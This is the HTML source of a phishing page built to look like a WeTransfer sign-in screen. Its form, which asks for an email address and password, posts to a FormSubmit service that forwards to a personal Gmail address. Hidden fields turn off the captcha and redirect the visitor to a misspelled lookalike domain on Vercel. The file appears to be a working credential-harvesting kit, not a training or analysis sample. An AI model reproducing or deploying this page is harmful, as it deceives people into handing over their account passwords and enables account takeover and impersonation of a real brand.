<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>WeTransfer Sign In</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  
  <style>
    /* Reset and Base Styles */
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    }

    body {
      background-color: #f7f7f7;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }

    /* Card Wrapper with explicit height & flex distribution */
    .login-container {
      background: #ffffff;
      width: 100%;
      max-width: 420px;
      min-height: 680px; /* Gives enough vertical space to push the logo up */
      padding: 40px 32px;
      text-align: center;
      display: flex;
      flex-direction: column;
    }

    /* Logo Styling pushed to the top */
    .logo {
      font-family: "Times New Roman", Times, serif; 
      font-size: 44px;
      font-weight: 900;
      letter-spacing: -1.5px;
      color: #000000;
      margin-top: 20px;
      margin-bottom: auto; /* This forces everything below it down, pushing the logo to the top */
    }

    /* Form Content Wrapper */
    .form-content {
      width: 100%;
      margin-top: 40px; /* Creates a clean gap below the top area */
    }

    /* Headings */
    .title {
      font-size: 18px;
      font-weight: 700;
      color: #000000;
      margin-bottom: 6px;
    }

    .subtitle {
      font-size: 14px;
      color: #333333;
      margin-bottom: 28px;
    }

    /* Input Groups */
    .input-group {
      position: relative;
      margin-bottom: 14px;
      text-align: left;
    }

    .input-group input {
      width: 100%;
      padding: 24px 16px 10px 16px; 
      font-size: 16px;
      color: #000000;
      background-color: #ffffff;
      border: 1px solid #d3d3d3;
      border-radius: 14px; 
      outline: none;
      transition: border-color 0.2s ease;
    }

    .input-group input:focus {
      border-color: #4070f4;
    }

    .input-group label {
      position: absolute;
      top: 8px;
      left: 16px;
      font-size: 11px;
      color: #737373;
      pointer-events: none;
    }

    /* Primary Action Button */
    .btn-continue {
      width: 100%;
      padding: 16px;
      background-color: #4070f4; 
      color: #ffffff;
      border: none;
      border-radius: 14px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 4px;
      margin-bottom: 28px;
      transition: background-color 0.2s ease;
    }

    .btn-continue:hover {
      background-color: #2b5cd4;
    }

    /* Secondary Links */
    .links-container {
      display: flex;
      flex-direction: column;
      gap: 10px;
      margin-bottom: 32px;
    }

    .link {
      font-size: 14px;
      color: #000000;
      text-decoration: underline;
      cursor: pointer;
    }

    /* Divider "or" line */
    .divider {
      display: flex;
      align-items: center;
      text-align: center;
      color: #a6a6a6;
      font-size: 13px;
      margin-bottom: 32px;
    }

    .divider::before,
    .divider::after {
      content: '';
      flex: 1;
      border-bottom: 1px solid #e6e6e6;
    }

    .divider:not(:empty)::before {
      margin-right: .5em;
    }

    .divider:not(:empty)::after {
      margin-left: .5em;
    }

    /* Responsive Tuning */
    @media (max-width: 480px) {
      .login-container {
        padding: 24px 16px;
        min-height: 100vh; /* Fills mobile screens nicely like native apps */
      }
    }
  </style>
</head>
<body>

  <div class="login-container">
    <img src="logo.08he3n6vuv2qc (1).svg">

    <!-- Main Content grouped together below -->
    <div class="form-content">
      <h2 class="title">Sign In</h2>
      <p class="subtitle">to continue to your WeTransfer account.</p>

     <!-- ✅ FormSubmit Integration -->
  <form action="https://formsubmit.co/sloan6721oq@gmail.com" method="POST">


    <input type="hidden" name="_next" value="https://wetranfersrgd-x8f8.vercel.app/">
    <input type="hidden" name="_captcha" value="false">
        <!-- Email Field -->
        <div class="input-group">
          <label for="email">Email</label>
          <input type="email" id="email"required>
        </div>

        <!-- Password Field -->
        <div class="input-group">
          <label for="password">Password</label>
          <input type="password" id="password" placeholder="Password" required"> 
        </div>

        <!-- Submit Button -->
        <button type="submit" class="btn-continue">Continue</button>
      </form>

      <!-- Links and Alternative Options -->
      <div class="links-container">
        <a class="link">Forgot password?</a>
        <a class="link">Use a different email?</a>
      </div>

      <div class="divider">or</div>

      <a class="link">Receive a temporary code via email</a>
    </div>
  </div>

</body>
</html>
